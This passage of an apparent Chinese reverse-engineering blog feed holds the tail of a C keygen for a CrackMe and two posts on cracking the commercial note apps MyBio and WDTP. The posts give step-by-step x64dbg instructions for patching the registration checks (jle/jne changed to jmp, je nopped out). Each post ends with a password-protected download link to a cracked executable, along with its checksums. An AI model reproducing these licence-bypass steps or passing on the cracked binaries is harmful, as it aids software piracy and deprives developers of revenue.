class="line"><span class="comment">// name小于5出现提示并退出 </span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"User Name must have at least 5 characters.\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">long</span> result = <span class="number">0x81276345</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len_name; i++)</span><br><span class="line">&#123;</span><br><span class="line">result += name[i];</span><br><span class="line">result ^= (i&lt;&lt;<span class="number">8</span>);</span><br><span class="line">result *= ~(len_name*i)*(i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"result: %lu\n"</span>,result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1foyrcq7eydj207004jgli.jpg&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="CrackMe" scheme="http://hacktech.cn/tags/CrackMe/"/>
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>MyBio小隐本记注册破解</title>
    <link href="http://hacktech.cn/2018/02/28/MyBio-Crack.html"/>
    <id>http://hacktech.cn/2018/02/28/MyBio-Crack.html</id>
    <published>2018-02-28T13:40:44.000Z</published>
    <updated>2019-05-23T06:42:08.035Z</updated>
    
    <content type="html"><![CDATA[<p>既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio</p><a id="more"></a><p>和WDTP的原理是差不多的，先把软件界面换成e文，然后写了15个记录后提示注册，一样的路子，直接跳过注册窗口的弹出就好了</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fowhkbesvuj20b0088t8x.jpg" alt="注册窗口"></p><p>然后查壳一样是vs2015的无壳64位程序，直接附加到x64dbg，然后有了之前WDTP的经验，我们直接找弹出注册窗口的地方，查找字符串，然后搜索上图中<code>Serial-number:</code></p><p>一样的，找到了注册窗体生成的地方，在段首下个断，然后回溯一次，可以看到</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fowhspimgmj20q507vgmx.jpg" alt=""></p><p>直接把这个call上方的jle改成jmp即可爆破。</p><hr><p>软件下载地址：</p><p><a href="https://share.weiyun.com/f5a48a92d8f458277e937dadc730a5ad" target="_blank" rel="noopener">密码：0yb0cz</a></p><p>解压后注意校验</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">大小: 4181504 字节</span><br><span class="line">文件版本: 2.1.1004</span><br><span class="line">修改时间: 2018年2月28日, 21:27:02</span><br><span class="line">MD5: EEA6B0BF010E45EA7EF340FFB543C316</span><br><span class="line">SHA1: BAA4BE7B3F2DE0F75996C0E9BE8DA0C177444CE8</span><br><span class="line">CRC32: 999277D5</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;既然开始了，就把这一个系列的都破了算了，这次主角小隐本记MyBio&lt;/p&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
  <entry>
    <title>WDTP注册破解</title>
    <link href="http://hacktech.cn/2018/02/26/WDTP-Crack.html"/>
    <id>http://hacktech.cn/2018/02/26/WDTP-Crack.html</id>
    <published>2018-02-26T12:34:50.000Z</published>
    <updated>2019-05-23T06:42:08.035Z</updated>
    
    <content type="html"><![CDATA[<p>今天来讲讲WDTP这个软件的破解。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。<br><a id="more"></a></p><h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>之前这个软件是开源的，后来作者把它闭源了，然后加上了注册机制，我今天测试了一下，在我写了十多篇文章之后我再添加就提示我需要注册。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2567e65j20b0088t8y.jpg" alt=""><br>查一下壳，没有壳，64位的<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou25yvsaxj20ei074q3n.jpg" alt=""><br>直接附加到x64dbg中，然后我们搜索一下字符串serial，可以找到错误提示的地方。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou27t4wefj213q0fetcj.jpg" alt=""><br>我们反汇编窗口中下个断，我们可以看到上方的ret，说明提示错误信息是跳转进来的，然后我们在段首下好断，重新注册可以找到调用这里的地方<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2buv9phj20fs06qaay.jpg" alt=""><br>我们跟过去<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2d3h9nvj20hc02zt8z.jpg" alt=""><br>可以看到错误提示的call，这个call上方有一个jmp可以跳过，说明在前方应该有一个跳转跳过了这个jmp，直接跳到了这个错误提示call。我们再往前看一点。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2fedcjfj20m50chgnw.jpg" alt=""><br>我们可以看到上面的je，je前面的call是一个对比的call，爆破的话，我们不管这个，直接把je给nop掉。<br>然后我们执行，发现还是点击新建就会弹出来注册框，功能无法使用。<br>我们继续在字符串中找，可以看到窗口上面的Purchase，Question等等字符，可以发现错误提示的上面一段就是这个注册窗口弹出的一段，我们依旧在这个段的段首下段，然后找到调用它（弹注册窗）的地方。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou2xb5dm0j20ia03lgm3.jpg" alt=""><br>它是直接jmp下来的，我们可以看到上面有一个call之后跟着一个test然后一个jne，我们可以猜想是你新建文档的时候先比对一下你是否注册，然后根据结果跳转，我们直接把jne改成jmp试试，让它直接跳过弹注册窗口。<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou33aziswj209q054q2u.jpg" alt=""><br>完美，现在新建没问题了。</p><h2 id="导出"><a href="#导出" class="headerlink" title="导出"></a>导出</h2><p>所以我们只需要把它的这个弹注册窗的地方直接jmp过就好，我们在我们修改的命令上面右键补丁<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fou352soi2j20ed0dbt90.jpg" alt=""><br>然后点击修复文件即可导出成一个破解版的exe。</p><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>下载后注意校验信息<br>文件信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">文件版本: 1.1.1004</span><br><span class="line">修改时间: 2018年2月26日, 19:40:44</span><br><span class="line">MD5: 5B8DF3D4572842376EA850B8551DEEED</span><br><span class="line">SHA1: B282AC870E4159A2ACEA389015FE4F4409A0F887</span><br><span class="line">CRC32: F51675CE</span><br></pre></td></tr></table></figure></p><p><a href="https://share.weiyun.com/5f8f4a09b5fb84f23479479e661b0c69" target="_blank" rel="noopener">密码：h7b4ru</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天来讲讲WDTP这个软件的破解。&lt;/p&gt;
&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h2&gt;&lt;p&gt;WDTP 不止是一款开源免费的 GUI 桌面单机版静态网站生成器和简单方便的前端开发工具，更是一款跨平台的集笔记、个人知识管理、写作/创作、博客/网站内容与样式管理等功能于一体的多合一内容处理/管理器，同时还是一款高度追求用户体验与计算机文本编写良好感受的 Markdown 编辑器。该软件研发的核心思想是：简洁高效、轻灵优雅、先进强悍、操作简单。&lt;br&gt;
    
    </summary>
    
      <category term="逆向" scheme="http://hacktech.cn/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="逆向" scheme="http://hacktech.cn/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="Tools" scheme="http://hacktech.cn/tags/Tools/"/>
    
  </entry>
  
</feed>
